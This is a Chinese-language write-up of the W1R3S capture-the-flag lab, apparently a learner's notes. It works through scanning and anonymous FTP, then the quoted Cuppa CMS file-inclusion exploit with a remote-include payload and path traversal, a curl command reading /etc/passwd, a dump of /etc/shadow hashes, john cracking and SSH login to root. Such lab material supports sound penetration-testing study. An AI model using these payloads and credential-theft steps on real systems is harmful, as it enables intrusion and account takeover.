---
icon: pen-to-square
date: 2025-07-11
tags: 
title: w1r3s
category:
  - 项目
---
## 信息收集
### 主机发现
扫描192.168.254.0/24网段
扫描192.168.254.142主机
### 端口扫描
```bash
┌──(root㉿localhost)-[/home]
└─# nmap -sT --min-rate 10000 192.168.254.142 -oA nmapscan/w1r3s-port
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-11 22:08 CST
Nmap scan report for 192.168.254.142
Host is up (0.00035s latency).
Not shown: 966 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 0.40 seconds
```
### 详细信息扫描
[[02_领域/渗透/信息收集#^ports|快速端口提取--shell语法]]

```bash
┌──(root㉿localhost)-[/home]
└─# sudo nmap -sT -sV -sC -O -p21,22,80,3306 192.168.254.142 -oA nmapscan/w1r3s-detail
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-11 22:16 CST
Nmap scan report for 192.168.254.142
Host is up (0.00061s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content
| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs
|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.254.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)
|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)
|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
3306/tcp open  mysql   MySQL (unauthorized)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.14 (97%), Linux 5.1 - 5.15 (97%), Linux 3.13 - 3.16 (91%), Linux 3.13 - 4.4 (91%), Linux 3.16 - 4.6 (91%), Linux 3.8 - 3.16 (91%), Linux 4.10 (91%), Linux 4.4 (91%), OpenWrt 19.07 (Linux 4.14) (91%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.08 seconds
```
## 渗透过程
### FTP
发现FTP服务匿名登录
[[FTP命令]]

#### **小技巧--FTP使用tips：**
1. 最好先输入binary切换为二进制模式，以免可执行文件下载出现问题
2. 多文件下载tips：`prompt`切换为非交互模式、
3. `mget`后接正则表达式

```bash
┌──(root㉿localhost)-[/home/w1r3s]
└─# ls
01.txt  02.txt  03.txt  employee-names.txt  worktodo.txt

┌──(root㉿localhost)-[/home/w1r3s]
└─# cat employee-names.txt
The W1R3S.inc employee list

Naomi.W - Manager
Hector.A - IT Dept
Joseph.G - Web Design
Albert.O - Web Design
Gina.L - Inventory
Rico.D - Human Resources


┌──(root㉿localhost)-[/home/w1r3s]
└─# cat worktodo.txt
        ı pou,ʇ ʇɥıuʞ ʇɥıs ıs ʇɥǝ ʍɐʎ ʇo ɹooʇ¡

....punoɹɐ ƃuıʎɐןd doʇs ‘op oʇ ʞɹoʍ ɟo ʇoן ɐ ǝʌɐɥ ǝʍ

┌──(root㉿localhost)-[/home/w1r3s]
└─# cat 01.txt
New FTP Server For W1R3S.inc

┌──(root㉿localhost)-[/home/w1r3s]
└─# cat 02.txt
#
#
#
#
#
#
#
#
01ec2d8fc11c493b25029fb1f47f39ce
#
#
#
#
#
#
#
#
#
#
#
#
#
SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==
############################################

┌──(root㉿localhost)-[/home/w1r3s]
└─# cat 03
cat: 03: No such file or directory

┌──(root㉿localhost)-[/home/w1r3s]
└─# cat 03.txt
___________.__              __      __  ______________________   _________    .__
\__    ___/|  |__   ____   /  \    /  \/_   \______   \_____  \ /   _____/    |__| ____   ____
  |    |   |  |  \_/ __ \  \   \/\/   / |   ||       _/ _(__  < \_____  \     |  |/    \_/ ___\
  |    |   |   Y  \  ___/   \        /  |   ||    |   \/       \/        \    |  |   |  \  \___
  |____|   |___|  /\___  >   \__/\  /   |___||____|_  /______  /_______  / /\ |__|___|  /\___  >
                \/     \/         \/                \/       \/        \/  \/         \/     \/
```
有未知加密
`01ec2d8fc11c493b25029fb1f47f39ce`


**小技巧**--hash类型识别
使用`hash-identifier`
```bash
┌──(root㉿localhost)-[/home/w1r3s]
└─# hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 01ec2d8fc11c493b25029fb1f47f39ce

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```


遇见hash可以用`john`破解
但是用可靠的MD5解密工具成功解密
![image.png](https://cdn.jsdelivr.net/gh/fakeppa/blog-img/20250712122810.png)
再校验一下



#### **小技巧**--Linux下的MD5计算
用linux进行MD5计算
```bash
┌──(root㉿localhost)-[/home/w1r3s]
└─# echo -n 'This is not a password' | md5sum
01ec2d8fc11c493b25029fb1f47f39ce  -
```
#### **小技巧--linux的base64解密**
用linux进行base64解密
```bash
┌──(root㉿localhost)-[/home/w1r3s]
└─# echo "SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==" | base64 -d
It is easy, but not that easy..
```
FTP入侵失败
### 80
目录爆破
```bash
sudo gobuster dir -u http://192.168.254.142 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
注意字典路径，非常常用
```bash
/wordpress            (Status: 301) [Size: 322] [--> http://192.168.254.142/wordpress/]
/javascript           (Status: 301) [Size: 323] [--> http://192.168.254.142/javascript/]
/administrator        (Status: 301) [Size: 326] [--> http://192.168.254.142/administrator/]
/server-status        (Status: 403) [Size: 303]
Progress: 220560 / 220561 (100.00%)
```
`gobuster`评价是不如`dirsearch`
```bash
dirsearch -u http://192.168.254.142
```

```bash
[12:53:46] Starting:
[12:53:47] 403 -  301B  - /.ht_wsr.txt
[12:53:47] 403 -  304B  - /.htaccess.bak1
[12:53:47] 403 -  304B  - /.htaccess.orig
[12:53:47] 403 -  304B  - /.htaccess.save
[12:53:47] 403 -  306B  - /.htaccess.sample
[12:53:47] 403 -  305B  - /.htaccess_extra
[12:53:47] 403 -  302B  - /.htaccess_sc
[12:53:47] 403 -  304B  - /.htaccess_orig
[12:53:47] 403 -  294B  - /.htm
[12:53:47] 403 -  295B  - /.html
[12:53:47] 403 -  303B  - /.htaccessOLD2
[12:53:47] 403 -  302B  - /.htaccessBAK
[12:53:47] 403 -  301B  - /.httr-oauth
[12:53:47] 403 -  304B  - /.htpasswd_test
[12:53:47] 403 -  300B  - /.htpasswds
[12:53:48] 403 -  295B  - /.php3
[12:53:48] 403 -  294B  - /.php
[12:53:49] 403 -  302B  - /.htaccessOLD
[12:53:51] 301 -  326B  - /administrator  ->  http://192.168.254.142/administrator/
[12:53:51] 302 -    7KB - /administrator/  ->  installation/
[12:53:51] 302 -    7KB - /administrator/index.php  ->  installation/
[12:53:57] 301 -  323B  - /javascript  ->  http://192.168.254.142/javascript/
[12:54:01] 403 -  303B  - /server-status
[12:54:01] 403 -  304B  - /server-status/
[12:54:05] 301 -    0B  - /wordpress/  ->  http://localhost/wordpress/
[12:54:05] 200 -    1KB - /wordpress/wp-login.php
```

#### **小技巧--kali的漏洞库**
`searchsploit 内容`
在`exploit-db.com`的本地拷贝中搜索
拉取`exploit`
`searchsploit cuppa -m 25971`

*这里再用传统方法试一下，yakit打开漏洞搜索，没有信息，这个tips效率蛮高的*
**内容**
```bash
┌──(root㉿localhost)-[/home/w1r3s]
└─# cat 25971.txt
# Exploit Title   : Cuppa CMS File Inclusion
# Date            : 4 June 2013
# Exploit Author  : CWH Underground
# Site            : www.2600.in.th
# Vendor Homepage : http://www.cuppacms.com/
# Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip
# Version         : Beta
# Tested on       : Window and Linux

  ,--^----------,--------,-----,-------^--,
  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
  `+---------------------------^----------|
    `\_,-------, _________________________|
      / XXXXXX /`|     /
     / XXXXXX /  `\   /
    / XXXXXX /\______(
   / XXXXXX /
  / XXXXXX /
 (________(
  `------'

####################################
VULNERABILITY: PHP CODE INJECTION
####################################

/alerts/alertConfigField.php (LINE: 22)

-----------------------------------------------------------------------------
LINE 22:
        <?php include($_REQUEST["urlConfig"]); ?>
-----------------------------------------------------------------------------


#####################################################
DESCRIPTION
#####################################################

An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.

http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]

#####################################################
EXPLOIT
#####################################################

http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

Moreover, We could access Configuration.php source code via PHPStream

For Example:
-----------------------------------------------------------------------------
http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
-----------------------------------------------------------------------------

Base64 Encode Output:
-----------------------------------------------------------------------------
PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+
-----------------------------------------------------------------------------

Base64 Decode Output:
-----------------------------------------------------------------------------
<?php
        class Configuration{
                public $host = "localhost";
                public $db = "cuppa";
                public $user = "root";
                public $password = "Db@dmin";
                public $table_prefix = "cu_";
                public $administrator_template = "default";
                public $list_limit = 25;
                public $token = "OBqIPqlFWf3X";
                public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
                public $upload_default_path = "media/uploadsFiles";
                public $maximum_file_size = "5242880";
                public $secure_login = 0;
                public $secure_login_value = "";
                public $secure_login_redirect = "";
        }
?>
-----------------------------------------------------------------------------

Able to read sensitive information via File Inclusion (PHP Stream)

################################################################################################################
 Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2
################################################################################################################
```
继续渗透，发现直接访问页面并进行GET传参没有用处，然后再github搜索源码(笑，简化版的代码审计)依照上面代码对应位置的提示，查看源码，发现是POST传参
```js
<?php include "../components/table_manager/fields/config/".@$cuppa->POST("urlConfig"); ?>
```
前面的路径拼接用户的urlConfig参数

#### **小技巧**--curl的POST传参
```bash
┌──(root㉿localhost)-[/home/w1r3s]
└─# curl --help all | grep url
     --data-urlencode <data>                HTTP POST data URL encoded
 -q, --disable                              Disable .curlrc
     --disallow-username-in-url             Disallow username in URL
     --doh-url <URL>                        Resolve hostnames over DoH
     --libcurl <file>                       Generate libcurl code for this command line
     --url <url>                            URL to work with
     --url-query <data>                     Add a URL query part
```
可以看到`     --data-urlencode <data>                HTTP POST data URL encoded`
[[杂物#CURL小技巧|curl的POST传参tips]]
```bash
curl --data-urlencode 'urlConfig=../../../../../../../../../etc/passwd' http://192.168.254.142/administrator/alerts/alertConfigField.php
```
获得文件内容
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
whoopsie:x:109:117::/nonexistent:/bin/false
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
saned:x:119:127::/var/lib/saned:/bin/false
usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
w1r3s:x:1000:1000:w1r3s,,,:/home/w1r3s:/bin/bash
sshd:x:121:65534::/var/run/sshd:/usr/sbin/nologin
ftp:x:122:129:ftp daemon,,,:/srv/ftp:/bin/false
mysql:x:123:130:MySQL Server,,,:/nonexistent:/bin/false
    </div>
</div>
```

注意每个用户的这个`root:x:0:0:root:/root:/bin/bash`
这个x，证明密码哈希被存放在`shadow`文件中，立刻查找同文件夹（etc）下面的`shadow`文件
```bash
┌──(root㉿localhost)-[/home/w1r3s]
└─# cat shadow
root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::
daemon:*:17379:0:99999:7:::
bin:*:17379:0:99999:7:::
sys:*:17379:0:99999:7:::
sync:*:17379:0:99999:7:::
games:*:17379:0:99999:7:::
man:*:17379:0:99999:7:::
lp:*:17379:0:99999:7:::
mail:*:17379:0:99999:7:::
news:*:17379:0:99999:7:::
uucp:*:17379:0:99999:7:::
proxy:*:17379:0:99999:7:::
www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::
backup:*:17379:0:99999:7:::
list:*:17379:0:99999:7:::
irc:*:17379:0:99999:7:::
gnats:*:17379:0:99999:7:::
nobody:*:17379:0:99999:7:::
systemd-timesync:*:17379:0:99999:7:::
systemd-network:*:17379:0:99999:7:::
systemd-resolve:*:17379:0:99999:7:::
systemd-bus-proxy:*:17379:0:99999:7:::
syslog:*:17379:0:99999:7:::
_apt:*:17379:0:99999:7:::
messagebus:*:17379:0:99999:7:::
uuidd:*:17379:0:99999:7:::
lightdm:*:17379:0:99999:7:::
whoopsie:*:17379:0:99999:7:::
avahi-autoipd:*:17379:0:99999:7:::
avahi:*:17379:0:99999:7:::
dnsmasq:*:17379:0:99999:7:::
colord:*:17379:0:99999:7:::
speech-dispatcher:!:17379:0:99999:7:::
hplip:*:17379:0:99999:7:::
kernoops:*:17379:0:99999:7:::
pulse:*:17379:0:99999:7:::
rtkit:*:17379:0:99999:7:::
saned:*:17379:0:99999:7:::
usbmux:*:17379:0:99999:7:::
w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
sshd:*:17554:0:99999:7:::
ftp:*:17554:0:99999:7:::
mysql:!:17554:0:99999:7:::
```
用dd快速删除没有哈希的用户
```bash
root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::
daemon:*:17379:0:99999:7:::
www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::
w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::
```
只剩下三个用户

#### **小技巧**--破解shadow
`john shadow`
```bash
┌──(root㉿localhost)-[/home/w1r3s]
└─# john shadow
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
www-data         (www-data)
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
computer         (w1r3s)
Proceeding with incremental:ASCII
```
很好用

连接`w1r3s`用户
`sudo ssh w1r3s@192.168.254.142`密码：`computer`

连接成功后用sudo查看flag即可
```bash
w1r3s@W1R3S:~$ sudo ls /root
flag.txt
w1r3s@W1R3S:~$ sudo cat /root/flag.txt
-----------------------------------------------------------------------------------------
   ____ ___  _   _  ____ ____      _  _____ _   _ _        _  _____ ___ ___  _   _ ____
  / ___/ _ \| \ | |/ ___|  _ \    / \|_   _| | | | |      / \|_   _|_ _/ _ \| \ | / ___|
 | |  | | | |  \| | |  _| |_) |  / _ \ | | | | | | |     / _ \ | |  | | | | |  \| \___ \
 | |__| |_| | |\  | |_| |  _ <  / ___ \| | | |_| | |___ / ___ \| |  | | |_| | |\  |___) |
  \____\___/|_| \_|\____|_| \_\/_/   \_\_|  \___/|_____/_/   \_\_| |___\___/|_| \_|____/

-----------------------------------------------------------------------------------------

                          .-----------------TTTT_-----_______
                        /''''''''''(______O] ----------____  \______/]_
     __...---'"""\_ --''   Q                               ___________@
 |'''                   ._   _______________=---------"""""""
 |                ..--''|   l L |_l   |
 |          ..--''      .  /-___j '   '
 |    ..--''           /  ,       '   '
 |--''                /           `    \
                      L__'         \    -
                                    -    '-.
                                     '.    /
                                       '-./

----------------------------------------------------------------------------------------
  YOU HAVE COMPLETED THE
               __      __  ______________________   _________
              /  \    /  \/_   \______   \_____  \ /   _____/
              \   \/\/   / |   ||       _/ _(__  < \_____  \
               \        /  |   ||    |   \/       \/        \
                \__/\  /   |___||____|_  /______  /_______  /.INC
                     \/                \/       \/        \/        CHALLENGE, V 1.0
----------------------------------------------------------------------------------------

CREATED BY SpecterWires

----------------------------------------------------------------------------------------
```

## 总结
本靶场还是很简单的，主要是提升渗透流程的规范性和效率，总结了超多的提升效率的小技巧，以后多加练习即可
在没有实战的情况下最好还是别看红笔，因为真的看不懂，并且很容易造成负反馈。实战之后，就能很轻易地理解他在说什么，并且依靠红笔的高效率小技巧，可以改善我们已有的渗透习惯
在从kali打靶之前还用批量poc工具扫描过，但是由于本cms的路径被修改过，所以没有被识别到，一般这种情况在实战中就被忽视过去了，但是在靶场这个精心构造出来的漏洞，相较于实战确实是有些违和